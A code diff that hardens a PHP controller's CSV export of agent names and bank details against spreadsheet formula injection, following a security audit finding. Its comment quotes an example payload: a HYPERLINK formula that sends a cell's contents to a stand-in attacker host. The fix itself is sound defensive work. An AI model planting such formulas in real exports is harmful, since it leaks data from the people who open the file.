@@ -187,10 +187,10 @@ class AgentCommissionSummaryController extends Controller
                 $missingBankInfo = blank($bankName) || blank($bankAccountNumber) || blank($bankAccountHolderName);
 
                 fputcsv($out, [
-                    $row['agent_name'] ?? '',
-                    $bankName ?? '',
-                    $bankAccountNumber ?? '',
-                    $bankAccountHolderName ?? '',
+                    self::csvSafe($row['agent_name'] ?? ''),
+                    self::csvSafe($bankName ?? ''),
+                    self::csvSafe($bankAccountNumber ?? ''),
+                    self::csvSafe($bankAccountHolderName ?? ''),
                     // BR-3 — integer satang everywhere upstream; dividing
                     // by 100 only here, at the CSV/display layer, exactly
                     // like the UI layer would. number_format guards
@@ -211,5 +211,42 @@ class AgentCommissionSummaryController extends Controller
         }, $filename, [
             'Content-Type' => 'text/csv; charset=UTF-8',
         ]);
+    }
+
+    /**
+     * Neutralise a spreadsheet formula in a CSV cell (SECURITY AUDIT 2026-08-21, V9).
+     *
+     * ── WHY THIS FILE IS THE ONE THAT NEEDED IT ──
+     *
+     * Four of the columns here are free text an AGENT types about
+     * themselves — their name and their three bank fields, none of which
+     * restricts the character set, because a bank account holder's name
+     * legitimately can be almost anything. The reader is a Company Admin,
+     * and what they do with this file is open it in Excel to pay people.
+     * That is the complete CSV-injection setup: attacker-controlled text,
+     * a spreadsheet, and a human who has every reason to trust the file
+     * because their own system produced it.
+     *
+     * A cell beginning `=HYPERLINK("http://attacker.example/?x="&A1,"เปิด")`
+     * exfiltrates whatever is in A1 the moment it is clicked; the DDE
+     * variants on older Office builds do worse. Excel, not this app, is
+     * what executes it — which is exactly why the app must not hand it
+     * over armed.
+     *
+     * The fix is the boring standard one: a leading apostrophe makes the
+     * spreadsheet treat the cell as text. It is invisible in the rendered
+     * cell, so a payout file stays readable. Tab and CR are in the list
+     * because both can shift a payload into a neighbouring cell.
+     *
+     * Only strings are passed through here. The money column is built by
+     * number_format() from an integer and cannot begin with any of these.
+     */
+    private static function csvSafe(string $value): string
+    {
+        if ($value === '') {
+            return $value;
+        }
+
+        return str_contains("=+-@\t\r", $value[0]) ? "'".$value : $value;
     }
 }
